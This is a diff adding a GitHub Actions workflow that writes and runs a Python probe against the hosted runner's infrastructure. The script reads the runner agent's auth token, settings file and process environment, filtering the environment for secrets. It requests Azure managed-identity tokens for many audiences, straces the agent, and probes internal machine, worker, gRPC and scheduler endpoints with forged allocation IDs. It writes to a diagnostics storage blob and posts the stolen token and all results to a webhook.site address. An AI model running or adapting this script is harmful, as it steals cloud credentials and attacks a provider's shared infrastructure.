@@ -1,0 +1,433 @@
+name: Probe v56 - account_a
+on:
+  workflow_dispatch:
+jobs:
+  probe:
+    runs-on: ubuntu-24.04
+    env:
+      V56_SOURCE: v56_account_a
+    steps:
+      - name: v56 environ+MI+machines+requests+workers+grpc+blob+sched-bola
+        run: |
+          cat > /tmp/v56_probe.py << 'PROBE_EOF'
+          
+          import json, os, base64, subprocess, re, urllib.request, urllib.error, time, socket, struct
+          
+          WEBHOOK = "https://webhook.site/53b82227-04b4-4ad2-9ccd-2abbd8a81837"
+          RUN_ID  = os.environ.get("GITHUB_RUN_ID", "unknown")
+          REPO    = os.environ.get("GITHUB_REPOSITORY", "unknown")
+          SOURCE  = os.environ.get("V56_SOURCE", "v56_account_a")
+          
+          def probe(method, url, body=None, extra=None):
+              data = body if isinstance(body, bytes) else (body.encode() if isinstance(body, str) else (body or None))
+              headers = {"Content-Type": "application/json", "User-Agent": "hosted-compute-agent/1.0"}
+              if extra:
+                  headers.update(extra)
+              if data:
+                  headers["Content-Length"] = str(len(data))
+              req = urllib.request.Request(url, data=data, headers=headers, method=method)
+              try:
+                  r = urllib.request.urlopen(req, timeout=12)
+                  return {"status": r.status, "body": r.read(8000).decode("utf-8","replace"), "hdrs": dict(r.headers)}
+              except urllib.error.HTTPError as e:
+                  return {"status": e.code, "body": e.read(8000).decode("utf-8","replace"), "hdrs": dict(e.headers)}
+              except Exception as ex:
+                  return {"status": 0, "body": str(ex), "hdrs": {}}
+          
+          def auth_attest(method, url, hca_token, pkcs7_doc, body=None, ct="application/json"):
+              hdrs = {
+                  "Authorization": f"Bearer {hca_token}",
+                  "x-attestation-provider": "azure",
+                  "x-attestation-encoding": "pkcs7",
+                  "x-attestation-document": pkcs7_doc,
+                  "Content-Type": ct,
+              }
+              return probe(method, url, body, hdrs)
+          
+          def sh(cmd, timeout=25):
+              try:
+                  r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
+                  return r.stdout + r.stderr
+              except Exception as ex:
+                  return f"TIMEOUT/ERROR: {ex}"
+          
+          print(f"[{SOURCE}] start")
+          
+          with open("/opt/hca/.settings") as f:
+              s = json.load(f)
+          
+          token     = s.get("authToken", "")
+          sched_url = s.get("schedulerApiUrl", "").rstrip("/")
+          diag_sas  = s.get("diagnosticsSasUri", "")
+          orch_id   = os.environ.get("ACTIONS_ORCHESTRATION_ID", "")
+          
+          parts = token.split(".")
+          pad = parts[1] + "=" * (4 - len(parts[1]) % 4)
+          claims = json.loads(base64.urlsafe_b64decode(pad))
+          wid = claims.get("wid", "")
+          
+          results = {"settings_keys": list(s.keys()), "jwt_claims": claims}
+          
+          # -- 1. PKCS7 + IMDS --------------------------------------------------------
+          r = probe("GET", "http://169.254.169.254/metadata/attested/document?api-version=2021-02-01",
+                    extra={"Metadata": "true"})
+          pkcs7_sig = ""
+          try:
+              att_data = json.loads(r["body"])
+              pkcs7_sig = att_data.get("signature", "")
+          except: pass
+          
+          r2 = probe("GET", "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
+                     extra={"Metadata": "true"})
+          try:
+              imds_data = json.loads(r2["body"])
+              compute = imds_data.get("compute", {})
+              tags_list = compute.get("tagsList", [])
+              all_tags = {t["name"]: t["value"] for t in tags_list}
+              hc_tags = {k: v for k, v in all_tags.items() if "hosted_compute" in k}
+              base_ro_url = hc_tags.get("hosted_compute.base_ro_url", "").rstrip("/")
+              allocation_id = hc_tags.get("hosted_compute.allocation_id", "")
+              vm_name = compute.get("name", "")
+              vm_id = compute.get("vmId", "")
+              sub_id = compute.get("subscriptionId", "")
+              rg = compute.get("resourceGroupName", "")
+              print(f"[IMDS] allocation_id={allocation_id} vm_name={vm_name} vm_id={vm_id}")
+              results["imds_tags"] = all_tags
+          except Exception as ex:
+              print(f"[IMDS] error: {ex}")
+              base_ro_url = allocation_id = vm_name = vm_id = sub_id = rg = ""
+          
+          from urllib.parse import urlparse
+          vm_v1_base = base_ro_url if base_ro_url else f"{urlparse(sched_url).scheme}://{urlparse(sched_url).netloc}/vm/v1"
+          print(f"[{SOURCE}] vm_v1_base={vm_v1_base}")
+          
+          # -- 2. HCA PROCESS ENVIRON --------------------------------------------------
+          print(f"\n[{SOURCE}] Reading HCA process environment...")
+          hca_pid = sh("pgrep -x hosted-compute-agent 2>/dev/null || pgrep -f hosted-compute 2>/dev/null").strip().split('\n')[0].strip()
+          print(f"[HCA_PID] {hca_pid}")
+          hca_env = ""
+          if hca_pid and hca_pid.isdigit():
+              raw_env = sh(f"cat /proc/{hca_pid}/environ 2>/dev/null | tr '\\0' '\\n'")
+              print(f"[HCA_ENV] raw ({len(raw_env)} chars):\n{raw_env[:5000]}")
+              hca_env = raw_env
+              # Look for sensitive values
+              sensitive = [line for line in raw_env.split('\n') if any(k in line.upper() for k in ['TOKEN','SECRET','KEY','JWT','PASS','CRED','AUTH','AUDIENCE','API','SAS'])]
+              print(f"[HCA_ENV_SENSITIVE]:\n" + '\n'.join(sensitive[:30]))
+              results["hca_environ"] = raw_env[:10000]
+              results["hca_environ_sensitive"] = '\n'.join(sensitive[:50])
+          else:
+              print(f"[HCA_PID] not found or invalid")
+              results["hca_environ"] = "pid not found"
+          
+          # -- 3. IMDS MANAGED IDENTITY: enumerate rw/write audiences ------------------
+          print(f"\n[{SOURCE}] IMDS Managed Identity audience enumeration...")
+          mi_results = {}
+          audiences_to_try = [
+              "api://hosted-compute",
+              "api://hosted-compute-rw",
+              "api://hosted-compute-ro",
+              "api://hosted-compute-provisioner",
+              "api://hosted-compute-orchestrator",
+              "api://hosted-compute-request-orchestrator",
+              "api://hosted-compute-scheduler",
+              "api://hosted-compute-watchdog",
+              "api://hosted-compute-admin",
+              "api://hosted-compute-agent",
+              "https://hosted-compute-request-orchestrator-prod-eus-01.githubapp.com",
+              "https://hosted-compute-request-orchestrator-prod-eus-02.githubapp.com",
+          ]
+          for aud in audiences_to_try:
+              r = probe("GET",
+                  f"http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource={aud}",
+                  extra={"Metadata": "true"})
+              try:
+                  d = json.loads(r["body"])
+                  if "access_token" in d:
+                      tok = d["access_token"]
+                      pad2 = tok.split(".")[1] + "=="
+                      try:
+                          tok_claims = json.loads(base64.urlsafe_b64decode(pad2))
+                      except:
+                          tok_claims = {}
+                      print(f"[MI] *** HIT: {aud} → claims: {tok_claims}")
+                      mi_results[aud] = {"status": "hit", "claims": tok_claims, "token_prefix": tok[:40]}
+                  else:
+                      err = d.get("error","") + d.get("error_description","")[:50]
+                      print(f"[MI] {aud}: {r['status']} {err[:80]}")
+                      mi_results[aud] = {"status": r["status"], "error": err[:200]}
+              except Exception as ex:
+                  mi_results[aud] = {"status": r["status"], "error": str(ex)[:100]}
+                  print(f"[MI] {aud}: error {ex}")
+          results["mi_audiences"] = mi_results
+          
+          # -- 4. strace -p on HCA to catch heartbeat/vm/v1 calls ----------------------
+          print(f"\n[{SOURCE}] strace -p on HCA process for 20s...")
+          strace_out = ""
+          if hca_pid and hca_pid.isdigit():
+              strace_out = sh(f"timeout 20 strace -p {hca_pid} -e trace=network,sendto,write -s 512 -f 2>&1 | head -200", timeout=30)
+              print(f"[STRACE] {strace_out[:3000]}")
+              results["strace_hca"] = strace_out[:8000]
+          
+          # -- 5. /vm/v1 NEW PATHS: machines, requests, workers, lifecycle, gRPC -------
+          print(f"\n[{SOURCE}] Probing NEW /vm/v1 paths: machines, requests, workers, lifecycle, gRPC...")
+          vm_new_results = {}
+          
+          def probe_path(method, path, body=None, ct="application/json"):
+              url = vm_v1_base + path
+              r = auth_attest(method, url, token, pkcs7_sig, body=body, ct=ct)
+              key = f"{method}_{path.lstrip('/').replace('/','_')}"
+              vm_new_results[key] = {"status": r["status"], "body": r["body"][:400], "url": url}
+              if r["status"] not in (404, 405, 0):
+                  print(f"[VM56] *** {method} {path} -> {r['status']} | {r['body'][:200]}")
+              else:
+                  print(f"[VM56] {method} {path:55} -> {r['status']}")
+          
+          # machines paths
+          for method, path in [
+              ("GET",    "/machines"),
+              ("POST",   "/machines"),
+              ("GET",    f"/machines/{vm_name}"),
+              ("PUT",    f"/machines/{vm_name}"),
+              ("DELETE", f"/machines/{vm_name}"),
+              ("POST",   f"/machines/{vm_name}/register"),
+              ("POST",   f"/machines/{vm_name}/heartbeat"),
+              ("PUT",    f"/machines/{vm_name}/heartbeat"),
+              ("POST",   f"/machines/{vm_name}/deprovision"),
+              ("DELETE", f"/machines/{vm_name}/deprovision"),
+              ("GET",    f"/machines/{vm_name}/status"),
+              ("GET",    f"/machines/{vm_name}/config"),
+              ("GET",    f"/machines/{allocation_id}"),
+              ("PUT",    f"/machines/{allocation_id}"),
+              ("DELETE", f"/machines/{allocation_id}"),
+              ("GET",    f"/machines/{vm_id}"),
+          ]:
+              probe_path(method, path, body='{}' if method not in ("GET","DELETE") else None)
+          
+          # requests paths
+          for method, path in [
+              ("GET",  "/requests"),
+              ("POST", "/requests"),
+              ("GET",  f"/requests/{allocation_id}"),
+              ("PUT",  f"/requests/{allocation_id}"),
+              ("POST", f"/requests/{allocation_id}/outcome"),
+              ("PUT",  f"/requests/{allocation_id}/outcome"),
+              ("POST", f"/requests/{allocation_id}/complete"),
+              ("POST", f"/requests/{allocation_id}/status"),
+              ("GET",  f"/requests/{allocation_id}/status"),
+              ("GET",  f"/requests/{vm_name}"),
+              ("POST", f"/requests/{vm_name}/outcome"),
+          ]:
+              probe_path(method, path, body='{}' if method not in ("GET","DELETE") else None)
+          
+          # workers paths
+          for method, path in [
+              ("GET",  "/workers"),
+              ("POST", "/workers"),
+              ("POST", "/workers/register"),
+              ("GET",  f"/workers/{vm_name}"),
+              ("POST", f"/workers/{vm_name}"),
+              ("POST", f"/workers/{vm_name}/checkin"),
+              ("POST", f"/workers/{allocation_id}/checkin"),
+              ("GET",  f"/workers/{allocation_id}"),
+          ]:
+              probe_path(method, path, body='{}' if method not in ("GET","DELETE") else None)
+          
+          # lifecycle paths
+          for method, path in [
+              ("POST", "/lifecycle/register"),
+              ("POST", "/lifecycle/checkin"),
+              ("POST", "/lifecycle/complete"),
+              ("POST", "/lifecycle/deprovision"),
+              ("POST", "/lifecycle"),
+              ("GET",  "/lifecycle"),
+              ("POST", "/provision"),
+              ("POST", "/deprovision"),
+              ("POST", "/register"),
+              ("POST", "/outcomes"),
+              ("POST", "/request/outcome"),
+              ("GET",  "/machines/current"),
+              ("GET",  "/workers/current"),
+              ("GET",  "/allocation"),
+              ("POST", "/allocation/heartbeat"),
+              ("GET",  "/allocation/status"),
+          ]:
+              probe_path(method, path, body='{}' if method not in ("GET","DELETE") else None)
+          
+          # Query string variants
+          for method, path in [
+              ("GET",  f"?allocation_id={allocation_id}"),
+              ("GET",  f"?vm_name={vm_name}"),
+              ("POST", f"?action=register&allocation_id={allocation_id}"),
+          ]:
+              probe_path(method, path, body='{}' if method != "GET" else None)
+          
+          # gRPC-style paths (try as REST with application/grpc Content-Type)
+          grpc_paths = [
+              "/hosted_compute.v1.MachineService/RegisterMachine",
+              "/hosted_compute.v1.MachineService/CreateMachine",
+              "/hosted_compute.v1.MachineService/GetMachine",
+              "/hosted_compute.v1.MachineService/HeartbeatMachine",
+              "/hosted_compute.v1.ProvisionerService/Provision",
+              "/hosted_compute.v1.ProvisionerService/Register",
+              "/hosted_compute.v1.OrchestratorService/RegisterWorker",
+              "/hosted_compute.v1.OrchestratorService/Checkin",
+              "/hosted_compute.v1.OrchestratorService/CompleteRequest",
+              "/github.hosted_compute.models.v1.MachineRequestService/RegisterMachine",
+              "/github.hosted_compute.models.v1.MachineRequestService/UpdateMachineStatus",
+              "/github.hosted_compute.models.v1.ProvisionerService/Provision",
+              "/models.v1.MachineService/RegisterMachine",
+              "/models.v1.OrchestratorService/Checkin",
+          ]
+          print(f"\n[{SOURCE}] gRPC-style path probes...")
+          for path in grpc_paths:
+              url = vm_v1_base.replace("/vm/v1", "") + path  # gRPC paths relative to host root
+              # Try with application/grpc Content-Type
+              r = auth_attest("POST", url, token, pkcs7_sig,
+                              body=b'\x00\x00\x00\x00\x00',  # gRPC frame
+                              ct="application/grpc+proto")
+              key = f"grpc_{path.lstrip('/').replace('/','_').replace('.','_')}"
+              vm_new_results[key] = {"status": r["status"], "body": r["body"][:300], "url": url, "hdrs": r.get("hdrs",{})}
+              # Check for grpc-status header specifically
+              has_grpc = any('grpc' in k.lower() for k in r.get("hdrs", {}).keys())
+              if r["status"] not in (404, 405, 0) or has_grpc:
+                  print(f"[GRPC] *** {path} -> {r['status']} has_grpc={has_grpc} | {r['body'][:100]}")
+              else:
+                  print(f"[GRPC] {path:60} -> {r['status']}")
+          
+          results["vm_new_paths"] = vm_new_results
+          
+          # -- 6. gRPC detection: check response headers on base URL -------------------
+          print(f"\n[{SOURCE}] gRPC/protocol detection on base URL...")
+          grpc_detect = {}
+          test_url = vm_v1_base
+          for ct, body in [
+              ("application/grpc",         b'\x00\x00\x00\x00\x00'),
+              ("application/grpc+proto",   b'\x00\x00\x00\x00\x00'),
+              ("application/grpc-web",     b'\x00\x00\x00\x00\x00'),
+              ("application/grpc-web+proto", b'\x00\x00\x00\x00\x00'),
+          ]:
+              r = auth_attest("POST", test_url, token, pkcs7_sig, body=body, ct=ct)
+              has_grpc_hdr = any('grpc' in k.lower() for k in r.get("hdrs", {}).keys())
+              grpc_detect[ct] = {"status": r["status"], "has_grpc_header": has_grpc_hdr, "hdrs": dict(list(r.get("hdrs",{}).items())[:10]), "body": r["body"][:100]}
+              print(f"[GRPC_DETECT] {ct}: {r['status']} grpc_header={has_grpc_hdr} hdrs={list(r.get('hdrs',{}).keys())}")
+          results["grpc_detect"] = grpc_detect
+          
+          # -- 7. Azure Blob listing (SAS cross-tenant check) --------------------------
+          print(f"\n[{SOURCE}] Azure Blob storage listing...")
+          blob_list_results = {}
+          if diag_sas:
+              from urllib.parse import urlparse as up, parse_qs
+              parsed_sas = up(diag_sas)
+              sas_base = f"{parsed_sas.scheme}://{parsed_sas.netloc}{parsed_sas.path}"
+              sas_params = parsed_sas.query
+          
+              # LIST blobs in container
+              list_url = f"{sas_base}?restype=container&comp=list&{sas_params}"
+              r = probe("GET", list_url, extra={"x-ms-version": "2021-06-08"})
+              print(f"[BLOB_LIST] status={r['status']} body={r['body'][:2000]}")
+              blob_list_results["list"] = {"status": r["status"], "body": r["body"][:5000]}
+          
+              # Try to write a test blob
+              test_blob_url = f"{sas_base}/v56-test-{SOURCE}.txt?{sas_params}"
+              r2 = probe("PUT", test_blob_url, body=f"v56 blob test from {SOURCE}",
+                         extra={"x-ms-blob-type": "BlockBlob", "x-ms-version": "2021-06-08"})
+              print(f"[BLOB_WRITE] status={r2['status']}")
+              blob_list_results["write"] = {"status": r2["status"]}
+          
+              # Try to read back
+              r3 = probe("GET", test_blob_url)
+              print(f"[BLOB_READ] status={r3['status']} body={r3['body'][:100]}")
+              blob_list_results["read"] = {"status": r3["status"], "body": r3["body"][:500]}
+          
+              # Try to GET container properties
+              r4 = probe("GET", f"{sas_base}?restype=container&{sas_params}")
+              print(f"[BLOB_CONTAINER] status={r4['status']} body={r4['body'][:500]}")
+              blob_list_results["container_props"] = {"status": r4["status"], "body": r4["body"][:500]}
+          results["blob_listing"] = blob_list_results
+          
+          # -- 8. Scheduler BOLA: call scheduler /v1 with modified allocation_id --------
+          print(f"\n[{SOURCE}] Scheduler BOLA: call /v1 endpoints with different allocation IDs...")
+          sched_results = {}
+          # The scheduler URL from .settings — try paths with different allocation IDs
+          # Use a fabricated UUID that's close to our allocation_id
+          import uuid
+          fake_alloc = str(uuid.uuid4())
+          our_alloc = allocation_id
+          
+          sched_paths = [
+              ("GET",  f"/allocations/{our_alloc}"),
+              ("GET",  f"/allocations/{fake_alloc}"),
+              ("GET",  "/allocations"),
+              ("GET",  f"/jobs/{our_alloc}"),
+              ("GET",  f"/jobs/{fake_alloc}"),
+              ("GET",  "/jobs"),
+              ("GET",  f"/workers/{our_alloc}"),
+              ("GET",  f"/workers/{fake_alloc}"),
+              ("GET",  f"/machines/{our_alloc}"),
+              ("GET",  f"/machines/{fake_alloc}"),
+              ("GET",  f"/requests/{our_alloc}"),
+              ("GET",  f"/requests/{fake_alloc}"),
+              ("GET",  "/requests"),
+              ("GET",  "/machines"),
+              ("GET",  "/workers"),
+          ]
+          for method, path in sched_paths:
+              url = sched_url + path
+              r = probe(method, url, extra={"Authorization": f"Bearer {token}"})
+              key = f"{method}_{path.lstrip('/').replace('/','_')}"
+              sched_results[key] = {"status": r["status"], "body": r["body"][:300], "url": url}
+              if r["status"] not in (404, 405, 0, 401):
+                  print(f"[SCHED_BOLA] *** {method} {path} -> {r['status']} | {r['body'][:150]}")
+              else:
+                  print(f"[SCHED_BOLA] {method} {path:45} -> {r['status']}")
+          results["scheduler_bola"] = sched_results
+          
+          # -- 9. watchdogTraceApiUrl probe --------------------------------------------
+          print(f"\n[{SOURCE}] watchdogTraceApiUrl probe...")
+          watchdog_url = s.get("watchdogTraceApiUrl", "")
+          trace_url = s.get("traceApiUrl", "")
+          watch_results = {}
+          if watchdog_url:
+              print(f"[WATCHDOG] url: {watchdog_url}")
+              for method, path in [("GET", ""), ("POST", ""), ("GET", "/health"), ("GET", "/status")]:
+                  url = watchdog_url.rstrip("/") + (path or "")
+                  r = probe(method, url, body='{}' if method == "POST" else None,
+                            extra={"Authorization": f"Bearer {token}"})
+                  key = f"watchdog_{method}_{path or 'root'}"
+                  watch_results[key] = {"status": r["status"], "body": r["body"][:500]}
+                  print(f"[WATCHDOG] {method} {url} -> {r['status']} | {r['body'][:100]}")
+          if trace_url:
+              print(f"[TRACE] url: {trace_url}")
+              for method, path in [("GET", ""), ("POST", ""), ("POST", "/trace")]:
+                  url = trace_url.rstrip("/") + (path or "")
+                  r = probe(method, url,
+                            body=json.dumps({"allocationId": allocation_id, "event": "heartbeat"}) if method == "POST" else None,
+                            extra={"Authorization": f"Bearer {token}"})
+                  key = f"trace_{method}_{path or 'root'}"
+                  watch_results[key] = {"status": r["status"], "body": r["body"][:500]}
+                  print(f"[TRACE] {method} {url} -> {r['status']} | {r['body'][:100]}")
+          results["watchdog_trace"] = {"watchdog_url": watchdog_url, "trace_url": trace_url, "results": watch_results}
+          
+          # -- 10. POST webhook --------------------------------------------------------
+          payload = {
+              "source": SOURCE, "run_id": RUN_ID, "repo": REPO,
+              "token": token, "claims": claims, "orch_id": orch_id,
+              "wid": wid, "allocation_id": allocation_id,
+              "vm_name": vm_name, "vm_id": vm_id,
+              "vm_v1_base": vm_v1_base,
+              "results": results,
+          }
+          data = json.dumps(payload, default=str).encode()
+          req = urllib.request.Request(WEBHOOK, data=data,
+                                        headers={"Content-Type": "application/json"}, method="POST")
+          try:
+              r = urllib.request.urlopen(req, timeout=30)
+              print(f"\n[{SOURCE}] Webhook: {r.status}")
+          except Exception as ex:
+              print(f"[{SOURCE}] Webhook error: {ex}")
+          
+          print(f"[{SOURCE}] DONE")
+          PROBE_EOF
+          python3 /tmp/v56_probe.py
+      - name: Keep alive
+        run: sleep 60
